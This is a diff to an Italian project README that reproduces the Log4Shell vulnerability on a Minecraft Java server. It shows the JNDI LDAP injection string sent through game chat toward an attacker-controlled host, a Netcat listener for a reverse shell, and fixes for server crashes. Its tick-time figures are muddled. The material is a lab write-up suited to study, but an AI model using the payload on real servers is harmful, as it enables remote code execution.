@@ -12,8 +12,8 @@ Minecraft è un videogioco sandbox molto popolare che da vari anni è stato acqu
 <br>Questo progetto si baserà sui server e client basati sulla versione Java, eseguibile solamente su sistemi Windows, Linux e Mac.
 
 ## La vulnerabilità del server
-**Log4j**: La vulnerabilità si basa sul framework Log4j che consente di gestire il logging dell'applicazione o dei servizi online offrendo anche la possibilità di comunicare con altri servizi sul sistema. Log4j offriva la possibilità di eseguire *lookup* risolvendo variabili tramite il protocollo JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critiche di Log4j.
-Minecraft implementa questo framework che sarà la causa della vulnerabilità, consentendo all'attaccante di eseguire codice malevolo da remoto senza autenticazione e senza che ci sia un operazione manuale da parte della vittima.
+**Log4j**: La vulnerabilità si basa sulla libreria Log4j che consente di gestire il logging dell'applicazione o dei servizi online offrendo anche la possibilità di comunicare con altri servizi sul sistema. Log4j offriva la possibilità di eseguire *lookup* risolvendo variabili tramite il protocollo JNDI (Java Name and Directory Interface), funzione abilitata di default nelle versioni critiche di Log4j.
+Minecraft implementa questa libreria che sarà la causa della vulnerabilità, consentendo all'attaccante di eseguire codice malevolo da remoto senza autenticazione e senza che ci sia un operazione manuale da parte della vittima.
 
 Dalla versione 1.7 fino alla 1.18 del gioco è stata trovata la vulnerabilità zero-day **CVE-2021-44228**, meglio nota come Log4Shell.
 Microsoft ha successivamente rilasciato una patch per prevenirne gli abusi, sostituendo direttamente la versione nella repository ufficiale per i client. 
@@ -31,7 +31,7 @@ Si scrive una classe Java che al suo interno contenga del codice malevolo come a
 
 Già questo basterebbe per la compromissione del sistema attaccato, tuttavia si è voluta utilizzare una classe Java che ne consenta il Remote Code Execution tramite una reverse shell. Perciò risulta necessaria la creazione di un ulteriore server TCP, nel nostro caso useremo Netcat.
 
-**Injection**: La fase di iniezione consiste di inviare via chat di gioco, un messaggio così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il framework inizi una connessione LDAP al server dell'attaccante.
+**Injection**: La fase di iniezione consiste di inviare via chat di gioco, un messaggio così composto: `${jndi:ldap://ip_serverLDAP_attaccante:porta_ldap/NomeClasseJavaMalevola}`, ciò farà si che il server inizi una connessione LDAP al server dell'attaccante.
 Non ci sono particolari complicanze in questa fase e questo messaggio può essere potenzialmente inviato da qualsiasi giocatore e da qualsiasi IP purché avente valido account Microsoft nel caso di server con verifica.
 
 Una volta che la connessione LDAP è stabilita con l'attaccante, il server rigetterà la richiesta al server HTTP che userà la classe Java (precompilata) come response al server vittima.
@@ -99,7 +99,7 @@ netcat -lnvp <porta>
    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Si è scoperto che nella file batch creato sul server per eseguirlo, (quindi non sulla console diretta), compariva un errore segnalante che la classe era stata compilata con una versione successiva e di conseguenza non poteva essere eseguita. Si è così provato a compilare la classe direttamente con la stessa versione che il server è stato compilato (ossia la JDK 1.8.0_181) ed a seguito di ulteriori tentavi si è riusciti a far eseguire la classe con successo.
 ---
 2. ${{\color{Goldenrod}{{\textbf{\textsf{Problematica:}}}}}}$ Successivamente all'esecuzione dell'iniezione e collegamento tramite reverse-shell, specialmente nella fase di collegamento il server vittima poteva chiudersi inaspettatamente.<br>
-    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: *`"A single server tick took 60.00 seconds (should be me max 0.05)"`*. Questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di 60000 tick (60 millisecondi), essendo il tempo di risposta standard 50 tick. Essendo questo valore predefinito troppo basso, non dava il tempo di mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modifica-è-stata-effettuata-sul-file-serverproperties-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-time-si-è-sostituito-il-valore-in--1)
+    ${{\color{yellowgreen}{{\textbf{\textsf{Soluzione:}}}}}}$ Tramite i file di log presenti nella cartella del server si è analizzato l'errore: *`"A single server tick took 60.00 seconds (should be me max 0.05)"`*. Questo è dovuto al fatto che di default il server è configurato per avere un tempo (in tick di gioco) massimo di risposta di 60000 tick (60 millisecondi), essendo il tempo di risposta standard 20 tick. Poiché questo valore predefinito è troppo basso, non consente al server di mantenere la connessione al Netcat dell'attaccante. Si è proceduto così ad aumentare questo tempo e per fini pratici lo si è impostato a "-1" in modo da disattivarlo.[<sup>2</sup>](#2-questa-modifica-è-stata-effettuata-sul-file-serverproperties-contenente-la-configurazione-di-base-del-server-alla-riga-max-tick-time-si-è-sostituito-il-valore-in--1)
 
     ![server_crash_tick](server_crash_tick.png)
 
